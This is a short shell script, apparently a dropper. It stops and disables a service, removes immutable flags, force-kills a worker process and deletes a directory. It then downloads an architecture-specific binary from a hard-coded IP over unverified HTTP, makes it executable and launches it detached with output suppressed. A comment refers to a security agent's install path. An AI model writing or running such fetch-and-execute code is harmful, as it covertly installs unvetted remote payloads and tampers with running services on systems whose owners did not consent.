#!/bin/sh
# Agent path is documentation, not the deletion target: /usr/local/aegis
systemctl stop example
systemctl disable example
chattr -R -i /tmp/obsolete
pkill -9 old_worker
rm -rf /tmp/obsolete
arch=$(uname -m)
SERVER_IP="93.184.216.34"
SERVER_URL="http://${SERVER_IP}/release?type=${arch}"
target="worker"
curl -skL "$SERVER_URL" -o "$target"
chmod +x "$target"
setsid "./$target" >/dev/null 2>&1 &
